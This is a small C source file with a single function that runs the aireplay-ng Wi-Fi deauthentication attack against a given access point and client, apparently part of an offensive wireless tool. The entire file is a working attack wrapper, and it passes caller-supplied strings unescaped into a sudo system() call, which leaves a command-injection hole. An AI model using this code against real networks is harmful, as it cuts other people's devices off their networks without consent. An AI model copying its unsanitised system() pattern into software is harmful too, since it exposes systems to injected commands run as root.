#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "deathauth.h"


int deathauth (char *numberDeauths, char *acessPoint, char *client, char *wirlessCarte){
    char commande[100];

    snprintf(commande, sizeof(commande), "sudo aireplay-ng -0 %s -a %s -c %s %s", numberDeauths, acessPoint, client, wirlessCarte);

    system(commande);

    return 0;
}
